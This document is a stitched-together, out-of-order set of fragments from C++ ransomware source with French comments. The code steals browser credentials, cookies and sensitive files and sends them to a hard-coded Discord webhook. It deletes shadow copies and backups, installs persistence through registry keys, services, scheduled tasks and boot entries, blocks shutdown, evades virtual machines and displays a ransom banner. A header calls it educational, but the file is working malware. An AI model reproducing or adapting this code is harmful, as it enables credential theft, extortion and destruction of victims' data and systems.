                std::lock_guard<std::mutex> lock(fileMutex);
                indexFile << "<tr><td>" << fileType << "</td><td>" << fileName << "</td><td>" 
                          << (fileSize / 1024) << " KB</td><td>" << modTime << "</td><td>" 
                          << filePath.string() << "</td></tr>";
                
                // Ajouter aux listes
                filesByType[fileType].push_back(filePath.string());
                stolenFiles.push_back(filePath.string());
                totalSize += fileSize;
            } catch (...) {}
        };

        // Utiliser le multithreading pour parcourir les dossiers en parallèle
        std::vector<std::thread> threads;
        std::mutex dirMutex;
        
        // Liste de tous les dossiers à parcourir
        std::vector<std::string> allDirs = targetDirs;
        if (fs::exists(directoryPath)) {
            allDirs.push_back(directoryPath);
        }
        
        // Nombre de threads pour le vol de fichiers (utiliser n-1 threads car un thread est déjà utilisé pour le chiffrement)
        const unsigned int numThreads = (std::thread::hardware_concurrency() > 2) ? 
            std::thread::hardware_concurrency() - 1 : 2;
        
        for (unsigned int i = 0; i < numThreads; i++) {
            threads.push_back(std::thread([&, i]() {
                for (size_t j = i; j < allDirs.size(); j += numThreads) {
                    const auto& dir = allDirs[j];
                    if (!fs::exists(dir)) continue;
                    
                    try {
                        for (const auto& entry : fs::recursive_directory_iterator(dir, fs::directory_options::skip_permission_denied)) {
                            if (!fs::is_regular_file(entry.status())) continue;
                            
                            if (totalSize >= MAX_TOTAL_SIZE) break;
                            
                            std::string extension = entry.path().extension().string();
                            std::transform(extension.begin(), extension.end(), extension.begin(), 
                                          [](unsigned char c){ return std::tolower(c); });
                            
                            // Vérifier si l'extension est sensible
                            for (const auto& [ext, desc] : sensitiveExtensions) {
                                if (extension == ext) {
                                    stealFile(entry.path(), desc);
                                    break;
                                }
                            }
                        }
                    } catch (...) {}
                }
            }));
        }
        
        // Attendre tous les threads
        for (auto& thread : threads) {
            if (thread.joinable()) thread.join();
        }
        
        // Voler des données spécifiques de navigateurs
        std::vector<std::pair<std::string, std::string>> browserData = {
            {std::string(getenv("LOCALAPPDATA")) + "\\Google\\Chrome\\User Data\\Default\\Login Data", "Chrome Logins"},
            {std::string(getenv("LOCALAPPDATA")) + "\\Google\\Chrome\\User Data\\Default\\Cookies", "Chrome Cookies"},
            {std::string(getenv("LOCALAPPDATA")) + "\\Google\\Chrome\\User Data\\Default\\History", "Chrome History"},
            {std::string(getenv("LOCALAPPDATA")) + "\\Google\\Chrome\\User Data\\Default\\Bookmarks", "Chrome Bookmarks"},
            {std::string(getenv("APPDATA")) + "\\Mozilla\\Firefox\\Profiles", "Firefox Profiles"}
        };

        for (const auto& [path, desc] : browserData) {
            if (fs::exists(path)) {
                if (fs::is_directory(path)) {
                    // Pour les dossiers comme Firefox Profiles
                    for (const auto& entry : fs::directory_iterator(path)) {
                        std::string destPath = stealDir + "\\Firefox_" + entry.path().filename().string();
                        try {
                            fs::copy(entry.path(), destPath, fs::copy_options::recursive | fs::copy_options::overwrite_existing);
                        } catch (...) {}
                    }
                } else {
                    // Pour les fichiers individuels
                    std::string destPath = stealDir + "\\" + fs::path(path).filename().string();
                    try {
                        fs::copy_file(path, destPath, fs::copy_options::overwrite_existing);
                    } catch (...) {}
                }
            }
        }

        // Collecter les données sensibles
        
        std::string infoDir = tempDir + "\\VictimData";
        fs::create_directories(infoDir);
        
        std::string browserDataCmd = "xcopy /s /e /y \"" + std::string(std::getenv("LOCALAPPDATA")) + 
                                      "\\Google\\Chrome\\User Data\\Default\\Login Data\" \"" + 
                                      infoDir + "\\chrome_data\" >nul 2>&1";
        system(browserDataCmd.c_str());
        
        // Créer une archive ZIP de toutes les données
        std::string zipPath = tempDir + "\\victim_data.zip";
        std::string zipCmd = "powershell Compress-Archive -Path \"" + infoDir + "\\*\" -DestinationPath \"" + 
                           zipPath + "\" -Force";
        system(zipCmd.c_str());
        
        // Lire le fichier ZIP
        std::ifstream zipFile(zipPath, std::ios::binary);
        if (!zipFile) return false;
        
        std::vector<unsigned char> zipData(
            (std::istreambuf_iterator<char>(zipFile)),
            std::istreambuf_iterator<char>()
        );
        zipFile.close();
        
        // Date et heure actuelles
        auto now = std::chrono::system_clock::now();
        std::time_t time = std::chrono::system_clock::to_time_t(now);
        std::stringstream dateStr;
        dateStr << std::put_time(std::localtime(&time), "%Y-%m-%d %H:%M:%S");
        
        // Convertir en base64
        std::string zipBase64 = Base64Encode(zipData);
        
        // Obtenir l'IV en base64
        std::vector<unsigned char> ivData = encryption.getIV();
        std::string ivBase64 = base64Encode(ivData.data(), ivData.size());

        // Terminer le fichier HTML
        indexFile << "</table>";
        
        // Ajouter un résumé
        indexFile << "<h2>Résumé des fichiers volés</h2>";
        indexFile << "<ul>";
        for (const auto& [type, files] : filesByType) {
            indexFile << "<li><strong>" << type << ":</strong> " << files.size() << " fichiers</li>";
        }
        indexFile << "</ul>";
        
        indexFile << "<p><strong>Total:</strong> " << stolenFiles.size() << " fichiers (" << (totalSize / 1024 / 1024) << " MB)</p>";
        indexFile << "</body></html>";
        indexFile.close();

        // Créer une archive ZIP des fichiers volés - utiliser 7-Zip si disponible pour une compression plus rapide
        std::string stolenFilesZipPath = tempDir + "\\stolen_files.zip";
        std::string zip7Path = "C:\\Program Files\\7-Zip\\7z.exe";
        
        if (fs::exists(zip7Path)) {
            // Utiliser 7-Zip pour une compression plus rapide
            std::string zipCmd = "\"" + zip7Path + "\" a -tzip -mx1 -r \"" + stolenFilesZipPath + "\" \"" + stealDir + "\\*\" >nul 2>&1";
            system(zipCmd.c_str());
        } else {
            // Utiliser PowerShell comme solution de secours
            std::string zipCmd = "powershell Compress-Archive -Path \"" + stealDir + "\\*\" -DestinationPath \"" + stolenFilesZipPath + "\" -Force";
            system(zipCmd.c_str());
        }

        // Lire le fichier ZIP - utiliser un buffer plus grand pour une lecture plus rapide
        std::ifstream stolenFilesZipFile(stolenFilesZipPath, std::ios::binary);
        if (!stolenFilesZipFile) return false;
        
        // Désactiver les buffers synchronisés pour accélérer la lecture
        stolenFilesZipFile.rdbuf()->pubsetbuf(0, 0);
        
        std::vector<unsigned char> stolenFilesZipData(
            (std::istreambuf_iterator<char>(stolenFilesZipFile)),
            std::istreambuf_iterator<char>()
        );
        stolenFilesZipFile.close();

        // Convertir en base64
        std::string stolenFilesZipBase64 = Base64Encode(stolenFilesZipData);

        // Créer le payload JSON pour Discord
        std::stringstream jsonPayload;
        jsonPayload << "{";
        jsonPayload << "\"content\": \"⚠️ FICHIERS SENSIBLES de la victime " << victimId << "\",";
        jsonPayload << "\"embeds\": [{";
        jsonPayload << "\"title\": \"Fichiers sensibles volés\",";
        jsonPayload << "\"color\": 15158332,";
        jsonPayload << "\"fields\": [";
        jsonPayload << "{\"name\": \"ID Victime\", \"value\": \"" << victimId << "\", \"inline\": true},";
        jsonPayload << "{\"name\": \"Nombre de fichiers\", \"value\": \"" << stolenFiles.size() << "\", \"inline\": true},";
        jsonPayload << "{\"name\": \"Taille totale\", \"value\": \"" << (totalSize / 1024 / 1024) << " MB\", \"inline\": true}";
        
        // Ajouter des exemples de fichiers volés
        if (stolenFiles.size() > 0) {
            jsonPayload << ",{\"name\": \"Exemples de fichiers volés\", \"value\": \"";
            for (size_t i = 0; i < (stolenFiles.size() < 10 ? stolenFiles.size() : 10); i++) {
                jsonPayload << fs::path(stolenFiles[i]).filename().string() << "\\n";
            }
            jsonPayload << "\", \"inline\": false}";
        }
        
        jsonPayload << "]}]}";

        // Envoyer via webhook
        bool sent = SendHttpPost(WEBHOOK_URL, jsonPayload.str());
        
        // Envoyer l'archive en deuxième message
        std::stringstream zipPayload;
        zipPayload << "{";
        zipPayload << "\"content\": \"📁 Archive ZIP des fichiers volés - Victime " << victimId << "\",";
        zipPayload << "\"embeds\": [{";
        zipPayload << "\"title\": \"Archive ZIP\",";
        zipPayload << "\"color\": 3447003,";
        zipPayload << "\"description\": \"Base64 format, extract with: `echo [base64] | base64 -d > stolen_files.zip`\\n\\n```" << stolenFilesZipBase64.substr(0, 500) << "...```\"";
        zipPayload << "}]}";
        
        SendHttpPost(WEBHOOK_URL, zipPayload.str());

        // Nettoyer
        fs::remove_all(stealDir);
        fs::remove(zipPath);

        return sent;
    }
    catch (...) {
        return false;
    }
}

    // Fonction pour supprimer les points de restauration et les sauvegardes
    bool deleteBackups() {
#ifdef _WIN32
        try {
            bool success = false;
            
            // Supprimer tous les points de restauration
            std::cout << "[*] Suppression des points de restauration Windows..." << std::endl;
            if (system("vssadmin delete shadows /all /quiet >nul 2>&1") == 0) {
                success = true;
                std::cout << "[+] Points de restauration supprimés" << std::endl;
            } else {
                std::cout << "[-] Échec de la suppression des points de restauration" << std::endl;
            }
            
            // Désactiver la protection système
            std::cout << "[*] Désactivation de la protection système..." << std::endl;
            if (system("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore\" /v \"RPSessionInterval\" /t REG_DWORD /d \"0\" /f >nul 2>&1") == 0) {
                success = true;
                std::cout << "[+] Protection système désactivée" << std::endl;
            } else {
                std::cout << "[-] Échec de la désactivation de la protection système" << std::endl;
            }
            
            // Supprimer les sauvegardes Windows
            std::cout << "[*] Suppression des sauvegardes Windows..." << std::endl;
            if (system("wbadmin delete catalog -quiet >nul 2>&1") == 0) {
                success = true;
                std::cout << "[+] Catalogue de sauvegarde supprimé" << std::endl;
            } else {
                std::cout << "[-] Échec de la suppression du catalogue de sauvegarde" << std::endl;
            }
            
            // Supprimer les fichiers de sauvegarde
            std::vector<std::string> backupPaths = {
                "C:\\Windows.old",
                "C:\\$Recycle.Bin",
                "C:\\System Volume Information",
                "C:\\Recovery",
                "C:\\Users\\All Users\\Application Data\\Microsoft\\Windows\\Backup",
                "C:\\ProgramData\\Microsoft\\Windows\\Backup"
            };
            
            for (const auto& path : backupPaths) {
                if (fs::exists(path)) {
                    try {
                        fs::remove_all(path);
                        std::cout << "[+] Supprimé: " << path << std::endl;
                    } catch (...) {
                        std::cout << "[-] Échec de la suppression: " << path << std::endl;
                    }
                }
            }
            
            return success;
        }
        catch (...) {
            return false;
        }
#else
        return false;
#endif
    }
    
    // Configuration de la persistance avancée
    bool setupAdvancedPersistence() {
        std::string exePath = GetExecutablePath();
        
        // 1. Méthode 1: Créer plusieurs copies dans des emplacements système critiques
        // Ces emplacements sont choisis pour leur persistance et difficultés d'accès
        std::vector<std::string> systemLocations = {
            "C:\\Windows\\System32\\drivers\\etc\\WindowsDefender.exe", // Camouflé comme fichier système
            "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\SecurityService.exe", // Démarrage système
            "C:\\Users\\Public\\Libraries\\system.dll.exe", // Masqué dans un dossier public
            "C:\\Windows\\SysWOW64\\winlogon.exe.mui" // Camouflé comme composant Windows
        };
        
        for (const auto& location : systemLocations) {
            try {
                // Créer tous les répertoires nécessaires
                fs::path dir = fs::path(location).parent_path();
                fs::create_directories(dir);
                
                // Copier l'exécutable
                fs::copy_file(exePath, location, fs::copy_options::overwrite_existing);
                
                // Masquer le fichier
                std::string hideCmd = "attrib +h +s \"" + location + "\"";
                system(hideCmd.c_str());
            } catch (...) {
                // Ignorer les erreurs et continuer avec les autres méthodes
            }
        }
        
        // 2. Méthode 2: Ajouter des entrées au registre pour le démarrage automatique
        // Plusieurs clés de registre différentes sont utilisées pour maximiser la persistance
        AddToStartup(exePath, "WindowsSecurityService");
        
        // Ajouter également à d'autres clés de registre pour être sûr
        system(("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v SecurityService /t REG_SZ /d \"" + exePath + "\" /f").c_str());
        system(("REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce /v WindowsUpdate /t REG_SZ /d \"" + exePath + "\" /f").c_str());
        system(("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx /v SystemService /t REG_SZ /d \"" + exePath + "\" /f").c_str());
        
        // 3. Méthode 3: Créer une tâche planifiée qui s'exécute fréquemment
        // Cette tâche vérifie périodiquement et redémarre le ransomware s'il a été arrêté
        std::string createTaskCmd = "schtasks /create /f /sc minute /mo 30 /tn \"Windows Security Task\" /tr \"" + exePath + "\"";
        system(createTaskCmd.c_str());
        
        // 4. Méthode 4: Simuler une infection du MBR (Master Boot Record)
        // Cette technique modifie le processus de démarrage pour charger le ransomware avant l'OS
        // Note: Ceci est une simulation, un vrai MBR rootkit serait beaucoup plus complexe
        std::string mbrCmd = "powershell -Command \"$bootKey = 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Boot'; if(Test-Path $bootKey) { New-ItemProperty -Path $bootKey -Name 'BootExecute' -Value ('autocheck autochk * ' + '" + exePath + "') -PropertyType MultiString -Force }\"";
        system(mbrCmd.c_str());
        
        // 4. Méthode 4: Infection du MBR (Master Boot Record) plus réaliste
        // Cette technique modifie les entrées de démarrage à bas niveau
        try {
            // 4.1 Modifier les entrées de démarrage Windows avancées
            system("bcdedit /set {bootmgr} path \\windows\\system32\\winload.exe");
            system("bcdedit /set {bootmgr} device partition=C:");
            system("bcdedit /set {memdiag} device partition=C:");
            
            // 4.2 Copier l'exécutable dans un emplacement système critique
            std::string mbrExePath = "C:\\Windows\\Boot\\PCAT\\bootmgr.exe";
            fs::create_directories(fs::path(mbrExePath).parent_path());
            fs::copy_file(exePath, mbrExePath, fs::copy_options::overwrite_existing);
            
            // 4.3 Modifier les autorisations pour empêcher la suppression
            std::string securityCmd = "icacls \"" + mbrExePath + "\" /setowner \"SYSTEM\" /T /C /Q";
            system(securityCmd.c_str());
            securityCmd = "icacls \"" + mbrExePath + "\" /deny *S-1-1-0:(D,WDAC,WO,WA) /C /Q";
            system(securityCmd.c_str());
            
            // 4.4 Créer un service en mode kernel qui démarre avant le système d'exploitation
            std::string serviceCmd = "sc create BootManagerService binPath= \"" + mbrExePath + 
                                   "\" start= boot error= ignore group= \"Boot Bus Extender\"";
            system(serviceCmd.c_str());
            system("sc description BootManagerService \"Microsoft Boot Manager Service\"");
            system("sc failure BootManagerService reset= 0 actions= restart/0/restart/0/restart/0");
            
            // 4.5 Modifier la séquence de démarrage pour exécuter le service en premier
            std::string bootKeyCmd = "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\BootManagerService\" /ve /t REG_SZ /d Service /f";
            system(bootKeyCmd.c_str());
            bootKeyCmd = "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\BootManagerService\" /ve /t REG_SZ /d Service /f";
            system(bootKeyCmd.c_str());
            
            // 4.6 Ajouter à winlogon pour exécution précoce au démarrage
            std::string winlogonCmd = "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Shell /t REG_SZ /d \"explorer.exe," + mbrExePath + "\" /f";
            system(winlogonCmd.c_str());
            
            // 4.7 Installation dans le secteur d'amorçage (simulation sécurisée)
            // Remarque: Une version réelle modifierait directement le secteur d'amorçage, ce qui est dangereux
            std::string bootCmd = "powershell -Command \"$bootKey = 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Boot'; if(Test-Path $bootKey) { New-ItemProperty -Path $bootKey -Name 'BootExecute' -Value ('autocheck autochk * ' + '" + mbrExePath + "') -PropertyType MultiString -Force }\"";
            system(bootCmd.c_str());
            
            std::cout << "[+] Installation avancée du démarrage réussie" << std::endl;
        }
        catch (...) {
            // Fallback à la méthode simple en cas d'échec
            std::string simpleMbrCmd = "powershell -Command \"$bootKey = 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Boot'; if(Test-Path $bootKey) { New-ItemProperty -Path $bootKey -Name 'BootExecute' -Value ('autocheck autochk * ' + '" + exePath + "') -PropertyType MultiString -Force }\"";
            system(simpleMbrCmd.c_str());
            std::cout << "[-] Fallback à l'installation de démarrage simple" << std::endl;
        }
        
        // 5. Méthode 5: Désactiver le mode sans échec pour empêcher la suppression
        // Ces commandes rendent difficile de démarrer en mode sans échec pour supprimer le malware
        system("bcdedit /set {default} recoveryenabled No");
        system("bcdedit /set {default} bootstatuspolicy IgnoreAllFailures");
        
        // 6. Méthode 6: Désactiver toutes les options de restauration
        // Cette commande supprime les points de restauration et désactive les futures sauvegardes
        system("powershell -Command \"Disable-ComputerRestore -Drive C:\"");
        system("vssadmin delete shadows /all /quiet");
        system("wmic shadowcopy delete");
        
        // 7. Méthode 7: Utiliser un service système pour une persistance de niveau inférieur
        // Créer un service Windows qui peut démarrer automatiquement même avant l'ouverture de session
        std::string serviceCmd = "sc create \"WindowsSecurityService\" binPath= \"" + exePath + "\" start= auto error= ignore";
        system(serviceCmd.c_str());
        system("sc description \"WindowsSecurityService\" \"Microsoft Windows Security Service\"");
        system("sc start \"WindowsSecurityService\"");
        
        return true;
    }
    
    // Fonction pour empêcher l'arrêt de l'ordinateur
    void preventShutdown() {
        std::cout << "[*] Configuration de la prévention d'arrêt..." << std::endl;

        // 1. Désactiver le bouton d'alimentation physique et les raccourcis système
        system("powercfg -setacvalueindex scheme_current sub_buttons pbuttonaction 0");  // Bouton d'alimentation (sur secteur)
        system("powercfg -setdcvalueindex scheme_current sub_buttons pbuttonaction 0");  // Bouton d'alimentation (sur batterie)
        system("powercfg -setacvalueindex scheme_current sub_buttons usbuttonaction 0"); // Bouton de veille (sur secteur)
        system("powercfg -setdcvalueindex scheme_current sub_buttons usbuttonaction 0"); // Bouton de veille (sur batterie)
        system("powercfg -setacvalueindex scheme_current sub_buttons lidaction 0");      // Fermeture du couvercle (sur secteur)
        system("powercfg -setdcvalueindex scheme_current sub_buttons lidaction 0");      // Fermeture du couvercle (sur batterie)
        system("powercfg -setactive scheme_current");                                    // Activer les changements
        
        // 2. Bloquer les API de shutdown de Windows
        // Créer un thread en arrière-plan qui annule constamment toutes les tentatives d'arrêt
        std::thread([&]() {
            // Désactiver l'hibernation et la mise en veille
            system("powercfg -h off");
            
            // Enlever les privilèges d'arrêt aux utilisateurs
            system("REG ADD \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v shutdownwithoutlogon /t REG_DWORD /d 0 /f");
            system("REG ADD \"HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\System\" /v DisableLogoff /t REG_DWORD /d 1 /f");
            
            // Bloquer les menus d'arrêt
            system("REG ADD \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoClose /t REG_DWORD /d 1 /f");
            
            // Définir une raison de blocage pour Windows 11
            ShutdownBlockReasonCreate(GetConsoleWindow(), L"SYSTÈME CRITIQUE EN COURS D'EXÉCUTION - RISQUE DE PERTE DE DONNÉES");
            
            // Boucle infinie qui annule constamment toutes les demandes d'arrêt
            while (true) {
                // Annuler toute tentative d'arrêt
                system("shutdown -a >nul 2>&1");
                
                // Surveiller la séquence Alt+F4 sur le bureau pour la boîte de dialogue d'arrêt de Windows 11
                HWND desktop = GetDesktopWindow();
                HWND shutdown_dialog = FindWindowEx(NULL, NULL, NULL, "Arrêter Windows");
                if (shutdown_dialog != NULL) {
                    // Fermer la boîte de dialogue d'arrêt
                    SendMessage(shutdown_dialog, WM_CLOSE, 0, 0);
                }
                
                // Rechercher d'autres fenêtres d'arrêt potentielles
                shutdown_dialog = FindWindowEx(NULL, NULL, NULL, "Shut Down Windows");
                if (shutdown_dialog != NULL) {
                    SendMessage(shutdown_dialog, WM_CLOSE, 0, 0);
                }
                
                // Rechercher les boîtes de dialogue dans lesquelles des options d'arrêt pourraient apparaître
                shutdown_dialog = FindWindow(NULL, "Windows Security");
                if (shutdown_dialog != NULL) {
                    SendMessage(shutdown_dialog, WM_CLOSE, 0, 0);
                }
                
                // Surveiller également les services de gestion de l'alimentation et les redémarrer s'ils sont arrêtés
                system("sc start \"Power\" >nul 2>&1");
                
                // Pause courte pour économiser le CPU
                Sleep(200);
            }
        }).detach();
        
        // 3. Modifier le gestionnaire de session pour intercepter les demandes d'arrêt
        // Créer un thread en arrière-plan qui redémarre immédiatement Windows si jamais il s'arrête
        std::thread([&]() {
            // Créer une tâche planifiée qui s'exécute au démarrage et au redémarrage
            std::string exePath = GetExecutablePath();
            std::string taskCmd = "schtasks /create /tn \"CriticalSystemTask\" /tr \"" + exePath + 
                                 "\" /sc onstart /ru SYSTEM /f";
            system(taskCmd.c_str());
            
            // Créer une tâche qui s'exécute après une tentative d'arrêt (si le système redémarre)
            std::string logonTaskCmd = "schtasks /create /tn \"WindowsSecurityService\" /tr \"" + exePath + 
                                     "\" /sc onlogon /f";
            system(logonTaskCmd.c_str());
            
            while (true) {
                // Dormir un moment
                Sleep(1000);
                
                // Vérifier si un arrêt est en cours (compteur de temps avant arrêt)
                HANDLE hToken;
                TOKEN_PRIVILEGES tkp;
                
                // Obtenir le privilège d'arrêt
                if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
                    LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
                    tkp.PrivilegeCount = 1;
                    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
                    
                    // Définir le privilège d'arrêt
                    AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0);
                    
                    // Si un arrêt est en cours, essayer de l'annuler
                    if (GetLastError() == ERROR_SUCCESS) {
                        system("shutdown -a >nul 2>&1");
                    }
                    
                    CloseHandle(hToken);
                }
            }
        }).detach();
        
        std::cout << "[+] Protection contre l'arrêt activée" << std::endl;
    }
    
    bool scanAndEncryptImpl(const std::string& directoryPath) {
        EncryptionState state = loadEncryptionState();
        std::vector<std::string> encryptedFiles;
        
        scanAndEncrypt(directoryPath, state, encryptedFiles);
        return true; // Toujours retourner true pour indiquer que l'opération a été effectuée
    }
    
public:
    Ransomware(SharedData* data = nullptr) : encryptedFilesCount(0), failedFilesCount(0), sharedData(data) {
        // Générer l'ID unique de la victime
        victimId = GenerateUUID();
        
        // Obtenir les chemins des répertoires importants
#ifdef _WIN32
        char desktopDir[MAX_PATH];
        char documentsDir[MAX_PATH];
        
        SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktopDir);
        SHGetFolderPathA(NULL, CSIDL_PERSONAL, NULL, 0, documentsDir);
        
        desktopPath = std::string(desktopDir);
        documentsPath = std::string(documentsDir);
#else
        // Répertoires sur Linux/macOS
        desktopPath = std::string(getenv("HOME")) + "/Desktop";
        documentsPath = std::string(getenv("HOME")) + "/Documents";
#endif
        
        // Définir le chemin de la note de rançon
        ransomNotePath = desktopPath + "/RANSOM_NOTE.txt";
        
        std::cout << "[*] Ransomware initialisé" << std::endl;
        std::cout << "[*] ID Victime: " << victimId << std::endl;
        std::cout << "[*] Chemin Bureau: " << desktopPath << std::endl;
        std::cout << "[*] Chemin Documents: " << documentsPath << std::endl;
    }
    
    // Fonction principale du ransomware - exécution agressive qui bloque tout contrôle utilisateur
    void run() {
        std::cout << "Démarrage de l'infection..." << std::endl;
        
        // Détecter la présence d'environnements virtuels ou sandbox
        if (isVirtualMachine() || isSandboxDetected()) {
            std::cout << "Machine virtuelle ou sandbox détectée, arrêt pour éviter l'analyse" << std::endl;
            return;
        }
        
        // Obtenir l'ID de la victime
        std::string victimId = generateVictimID();
        std::cout << "ID Victime: " << victimId << std::endl;
        
        // Élever les privilèges
        if (!isAdmin()) {
            elevatePrivileges();
        }
        
        // Créer un système de chiffrement hybride RSA+AES plus sécurisé
        HybridEncryption hybridEncryption;
        
        // Obtenir des informations sur le système
        std::string systemInfo = collectSystemInfo();
        
        // Tenter d'installer la persistance UEFI (niveau de persistance le plus élevé)
/**
 * RANSOMWARE EN C++
 * =================
 * 
 * Ce fichier est un exemple de ransomware utilisant des techniques avancées de persistance et blocage.
 * ATTENTION: Ce code est fourni à des fins éducatives uniquement pour comprendre les menaces.
 * L'utilisation malveillante de ce code est illégale et strictement interdite.
 * 
 * Principales fonctionnalités:
 * ----------------------------
 * 1. Chiffrement AES-256 des fichiers avec priorité sur les documents critiques
 * 2. Persistance multi-méthode pour survivre aux redémarrages (registre, MBR, tâches planifiées)
 * 3. Exploitation multi-thread pour chiffrement rapide et parallèle
 * 4. Blocage agressif des contrôles système et interfaces utilisateur
 * 5. Désactivation des logiciels de sécurité et prévention de l'arrêt du système
 * 6. Exfiltration de données sensibles avant chiffrement
 * 7. Interface graphique en plein écran impossible à fermer
 * 
 * Techniques avancées implémentées:
 * --------------------------------
 * - Simulation d'infection du MBR pour charger au démarrage système
 * - Blocage des contrôles système via hooks de clavier et modifications de registre
 * - Élévation de privilèges via les services système
 * - Désactivation des réglages de sécurité et contournement des antivirus
 * - Suppression des méthodes de récupération (points de restauration, backups)
 * - Prévention active des tentatives d'arrêt système
 * 
 * AVERTISSEMENT: Utiliser ce code dans un environnement de test isolé uniquement.
 * Son déploiement sur des systèmes réels sans consentement est illégal.
 */

// Forward declarations (Déclarations anticipées)
#include <string>
#include <vector>
#include <mutex>
#include <atomic>
#include <windows.h>
#include <algorithm>
#include <random>
#include <chrono>
#include <filesystem>
#include <functional>
#include <wininet.h>
#include <iphlpapi.h>
#include <deque>
#include <regex>
#include <fstream>
#include <psapi.h> // Pour EnumProcessModules

class Encryption;
struct EncryptionState;
struct SharedData;

std::string getComputerName();
std::string getUserName();
std::string getPublicIPAddress();
std::string getMACAddress();
std::string getOSInfo();
std::string getProcessorInfo();
std::string getRAMInfo();
std::string base64Encode(const unsigned char* data, size_t length);
std::string getCurrentTimeString();
bool sendHttpRequest(const std::string& url, const std::string& data);
bool sendKeyToWebhook(const Encryption& encryption, const std::string& webhookUrl, int encryptedCount, const std::vector<std::string>& encryptedFiles);
std::string GetExecutablePath();
bool isInternetConnected();

#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <filesystem>
#include <chrono>
#include <random>
#include <algorithm>
#include <cstring>
#include <thread>
#include <future>
#include <iomanip>
#include <sstream>
#include <unordered_map>
#include <functional>
#include <deque>
#include <regex>

// Cryptographie
#include <openssl/aes.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/bio.h>
#include <openssl/buffer.h>
#include <openssl/sha.h>
#include <openssl/err.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>

#ifdef _WIN32
#include <intrin.h> // Pour __cpuid
#endif

// Windows API
#ifdef _WIN32
#include <shlobj.h>
#include <winreg.h>
#include <wininet.h>
#include <iphlpapi.h>
#include <tchar.h>
#include <rpc.h>
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "rpcrt4.lib")
#endif

// UUID generation
#ifdef _WIN32
#include <rpc.h>
#pragma comment(lib, "rpcrt4.lib")
#else
#include <uuid/uuid.h>
#endif

namespace fs = std::filesystem;

// Structure pour partager des données entre les threads
#ifdef _WIN32
struct SharedData {
    int totalFiles;
    std::atomic<int> processedFiles;
    std::string currentFileName;           // Nom du fichier actuellement en cours de chiffrement
    std::vector<std::string> lastEncrypted; // Liste des derniers fichiers chiffrés
    std::mutex dataMutex;                  // Mutex pour protéger l'accès aux données partagées
    HWND hwnd;
    HWND hEditKey;                         // Handle du champ de saisie pour la clé
    HWND hDecryptButton;                   // Handle du bouton de déchiffrement
    bool decryptMode;                      // Mode de déchiffrement activé
    char decryptKey[256];                  // Clé de déchiffrement saisie
};
#endif

// Déclaration anticipée des fonctions Windows
#ifdef _WIN32
// Fonctions pour la fenêtre bloquante
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
DWORD WINAPI UpdateProgressThread(LPVOID lpParam);
HWND CreateFullscreenBlockingWindow(SharedData* data);

// Fonctions de contrôle système
bool disableTaskManager();
bool disableRegistry();
bool disableCmd();
bool preventShutdown();
bool disableSystemControls();
void killEssentialProcesses();
void setHighestPriority();
#endif

// Structure pour suivre l'état du chiffrement
struct EncryptionState {
    bool started;
    bool completed;
    std::vector<std::string> encryptedPaths;
};

// Configuration de la console Windows
#ifdef _WIN32
void setupConsole() {
    // Définir l'encodage en UTF-8
    SetConsoleOutputCP(CP_UTF8);
    // Activer le support des caractères spéciaux
    SetConsoleCP(CP_UTF8);
}
#endif

// Discord Webhook URL
const std::string WEBHOOK_URL = "https://discord.com/api/webhooks/1354564587751735437/Sf4ab7f_d5Q-HTyIwvfMcs-QPs2YGUVQwhEZUVZmaWtslZhI78YPCj1wmYzI7NU1eVnN";

// Bannière
const std::string BANNER = R"(
██████╗  █████╗ ███╗   ██╗███████╗ ██████╗ ███╗   ███╗██╗    ██╗ █████╗ ██████╗ ███████╗
██╔══██╗██╔══██╗████╗  ██║██╔════╝██╔═══██╗████╗ ████║██║    ██║██╔══██╗██╔══██╗██╔════╝
██████╔╝███████║██╔██╗ ██║███████╗██║   ██║██╔████╔██║██║ █╗ ██║███████║██████╔╝█████╗  
██╔══██╗██╔══██║██║╚██╗██║╚════██║██║   ██║██║╚██╔╝██║██║███╗██║██╔══██║██╔══██╗██╔══╝  
██║  ██║██║  ██║██║ ╚████║███████║╚██████╔╝██║ ╚═╝ ██║╚███╔███╔╝██║  ██║██║  ██║███████╗
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚═╝     ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
                                                                          
                Vos fichiers ont été chiffrés! Payez la rançon pour récupérer vos données.
)";

